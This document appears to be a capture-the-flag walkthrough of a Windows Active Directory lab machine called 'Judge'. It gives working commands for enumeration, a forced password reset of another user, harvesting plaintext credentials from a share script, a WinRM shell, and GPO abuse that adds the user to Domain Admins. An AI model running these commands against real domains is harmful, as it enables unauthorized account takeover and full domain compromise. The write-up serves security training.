---
description: >-
  A walkthrough of the Judge machine on the Ronin66 platform, covering the full
  attack chain from initial access to privilege escalation and root.
cover: ../.gitbook/assets/judge.jpeg
coverY: 0
---

# Judge(Windows)

* The client has provided us with the credentials since it is an Assumed Breach Scenario

```
== Assumed Breach ==

Username: d.taylor
Password: T@ylor.123
```

## Initial Enumeration :&#x20;

### NMAP :&#x20;

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-12 20:36:10Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: judge.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: judge.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49861/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

#### SMB (135,139,445):

* Since we are provided with the credentials, we see if we have access to any interesting shares

```
┌──(kali㉿kali)-[~/Desktop/ronin66/judge]
└─$ nxc smb judge.local -u 'd.taylor' -p 'T@ylor.123' --shares
SMB         172.16.18.13    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:judge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.13    445    DC01             [+] judge.local\d.taylor:T@ylor.123 
SMB         172.16.18.13    445    DC01             [*] Enumerated shares
SMB         172.16.18.13    445    DC01             Share           Permissions     Remark
SMB         172.16.18.13    445    DC01             -----           -----------     ------
SMB         172.16.18.13    445    DC01             ADMIN$                          Remote Admin
SMB         172.16.18.13    445    DC01             C$                              Default share
SMB         172.16.18.13    445    DC01             IPC$            READ            Remote IPC
SMB         172.16.18.13    445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.18.13    445    DC01             script                          
SMB         172.16.18.13    445    DC01             SYSVOL          READ            Logon server share 
```

* We see that there is an unusual share named `script` but we do not have access to it
* Next we list out the users in the Domain

```
┌──(kali㉿kali)-[~/Desktop/ronin66/judge]
└─$ nxc smb judge.local -u 'd.taylor' -p 'T@ylor.123' --users 
SMB         172.16.18.13    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:judge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.13    445    DC01             [+] judge.local\d.taylor:T@ylor.123 
SMB         172.16.18.13    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         172.16.18.13    445    DC01             Administrator                 2026-01-01 01:08:10 0       Built-in account for administering the computer/domain 
SMB         172.16.18.13    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         172.16.18.13    445    DC01             krbtgt                        2025-10-05 09:38:37 0       Key Distribution Center Service Account 
SMB         172.16.18.13    445    DC01             j.smith                       2025-10-05 15:06:42 0        
SMB         172.16.18.13    445    DC01             e.brown                       2025-10-05 15:41:02 0        
SMB         172.16.18.13    445    DC01             m.clark                       2025-10-05 15:08:25 0        
SMB         172.16.18.13    445    DC01             s.wilson                      2025-10-05 16:40:15 0        
SMB         172.16.18.13    445    DC01             d.taylor                      2025-10-05 15:11:46 0        
SMB         172.16.18.13    445    DC01             [*] Enumerated 8 local users: JUDGE
```

* We got the users but none of the user had their passwords in the description, so no easy win for us here
* Now we move to `Bloodhound` for further enumeration and to map out our attack path

## Bloodhound :&#x20;

### Collecting the Loot :&#x20;

* Now we collect the Bloodhound Loot using `bloodyad`

```
┌──(kali㉿kali)-[~/Desktop/ronin66/judge]
└─$ bloodyad --host dc01.judge.local --domain judge.local -u 'd.taylor' -p 'T@ylor.123' get bloodhound
[+] Connecting to LDAP server
[+] Connected to LDAP serrver
Dumping schema: 2it [00:01,  1.30it/s]
Generating lookuptable: 81it [00:02, 38.60it/s]
Dumping SDs: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 85/85 [00:19<00:00,  4.33it/s]
Dumping domains: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  1.50it/s]
Dumping users: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 8/8 [00:00<00:00, 33.22it/s]
Dumping computers: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  4.58it/s]
Dumping groups: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 49/49 [00:00<00:00, 186.15it/s]
Dumping GPOs: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00,  8.72it/s]
Dumping OUs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  4.38it/s]
Dumping Containers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 69.78it/s]
[+] Bloodhound data saved to 20260812T133518_Bloodhound.zip
[+] Found 0 trusts
```

Now we spin up our `bloodhound`, ingest the file and Analyze it.

### Bloodhound Analysis :&#x20;

* Here we found that our controlled User `d.taylor` has `ForceChangePassword`  right over the user `s.wilson` .

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

* Now we go ahead and exploit it to gain access as the user `s.wilson`

```
┌──(kali㉿kali)-[~/Desktop/ronin66/judge]
└─$ net rpc password "s.wilson" "newP@ssword2022" -U "judge.local"/"d.taylor"%"T@ylor.123" -S "dc01.judge.local"
```

* Now we check our bloodhound to see if this user has any `Outbound Object Control`
* This user doesn’t have any `Outbound Object Control` so next we check the Groups this user is a member of

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

* We do see that this user is a member of `IT` group so now we go ahead and check the shares that are accessible to this user being a part of this group

```
┌──(kali㉿kali)-[~/Desktop/ronin66]
└─$ nxc smb judge.local -u 's.wilson' -p 'newP@ssword2022' --shares                         
SMB         172.16.18.13    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:judge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.18.13    445    DC01             [+] judge.local\s.wilson:newP@ssword2022 
SMB         172.16.18.13    445    DC01             [*] Enumerated shares
SMB         172.16.18.13    445    DC01             Share           Permissions     Remark
SMB         172.16.18.13    445    DC01             -----           -----------     ------
SMB         172.16.18.13    445    DC01             ADMIN$                          Remote Admin
SMB         172.16.18.13    445    DC01             C$                              Default share
SMB         172.16.18.13    445    DC01             IPC$            READ            Remote IPC
SMB         172.16.18.13    445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.18.13    445    DC01             script          READ            
SMB         172.16.18.13    445    DC01             SYSVOL          READ            Logon server share
```

* We now see that we have `READ` Permission over the `Script` share
* We connected to the share and found out that there is a file named `mount.bat`&#x20;

```
┌──(kali㉿kali)-[~/Desktop/ronin66]
└─$ smbclient '//dc01.judge.local/script' -U 's.wilson'                         
Password for [WORKGROUP\s.wilson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct  5 11:40:23 2025
  ..                                  D        0  Sun Oct  5 11:40:23 2025
  mount.bat                           A      215  Sun Oct  5 11:39:59 2025

                16636159 blocks of size 4096. 10722315 blocks available
smb: \> get mount.bat 
getting file \mount.bat of size 215 as mount.bat (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
```

## Shell as `e.brown` :

* We now go ahead and check the contents of the file

```
┌──(kali㉿kali)-[~/Desktop/ronin66/judge]
└─$ cat mount.bat 
@echo off
REM Map a network drive using e.brown credentials

set USERNAME=e.brown
set Password=El3vator876#

net use Z: \\SERVER\Sahred /user:%USERNAME% %PASSWORD%

echo Drive Z: mapped for %USERNAME%
pause
```

* That’s sweet, here we found out the credentials for the user `e.brown`
* Now we go to `Bloodhound` to check this user’s permission

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

* We do see that this user is a member of `Remote Management Users` Group so we go ahead and use `evil-winrm`

```
┌──(kali㉿kali)-[~/Desktop/ronin66/judge]
└─$ evil-winrm -i dc01.judge.local -u 'e.brown' -p 'El3vator876#'     
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\e.brown\Documents> cd ../../
*Evil-WinRM* PS C:\Users> ls

```

* Now here, We got out user flag in the `C:\Users\Public\` directory

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

## Access as `Administrator` :

* Now we saw in Bloodhound that our user `e.brown` has an outbound object control so we go ahead and check it.

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

* Here, we found that this user has `WriteOwner` Privilege over the `Default Domain Policy` which was an easy win for us as we could push a new policy and add our owned user `e.brown` to the Domain Admins Group as this user already was a member of  `Remote Management Users` group.
* Now we go ahead and abuse it using `pygpoabuse.py` script

{% embed url="https://github.com/Hackndo/pyGPOAbuse" %}

```
┌──(.venv)─(kali㉿kali)-[~/Desktop/ronin66/judge/pyGPOAbuse]
└─$ python3 pygpoabuse.py judge.local/'e.brown':'El3vator876#' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname SecurityUpdate  -dc-ip 172.16.18.13 -command 'net group "Domain Admins" e.brown /add /domain' -filter-enabled -target-dns-name dc01.judge.local
[+] ScheduledTask SecurityUpdate created!
```

* Now we used `gpupdate /force` command in the `evil-winrm` session for updating the `GPO`

```
*Evil-WinRM* PS C:\Users\Public> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

* Now we were `Domain Admin` so we could access the Administrator Directory
* Now we go ahead and get the `root.flg` in the `C:\Users\Administrator\Desktop` directory

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

* Now We have successfully solved this machine!!!
